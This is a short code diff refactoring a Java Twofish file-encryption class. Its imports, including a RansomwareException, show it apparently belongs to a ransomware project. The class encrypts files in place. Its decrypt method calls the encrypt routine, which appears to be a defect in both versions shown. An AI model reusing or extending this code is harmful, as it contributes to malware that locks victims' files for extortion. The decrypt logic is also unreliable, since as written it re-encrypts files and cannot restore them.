@@ -1,17 +1,17 @@
 package Agent.EncryptionAlgo;
 
 import java.io.File;
-import java.security.GeneralSecurityException;
 
 import javax.crypto.SecretKey;
 
+import Agent.Utils.JavaCryptoUtil;
 import Agent.exceptions.CryptoException;
 import Agent.exceptions.RansomwareException;
 
-public class Twofish implements CryptoInterface {
+public class Twofish implements CryptoAlgorithm {
 
 	@Override
-	public void encrypt(SecretKey skey, File fileToEncrypt)  throws RansomwareException, GeneralSecurityException {
+	public void encrypt(SecretKey skey, File fileToEncrypt)  throws RansomwareException {
 
 		try {
 			JavaCryptoUtil.encrypt(skey, fileToEncrypt, "twofish");
@@ -22,7 +22,7 @@ public class Twofish implements CryptoInterface {
 	}
 
 	@Override
-	public void decrypt(SecretKey skey, File fileToDecrypt)  throws RansomwareException, GeneralSecurityException {
+	public void decrypt(SecretKey skey, File fileToDecrypt)  throws RansomwareException {
 
 		try {
 			JavaCryptoUtil.encrypt(skey, fileToDecrypt, "twofish");
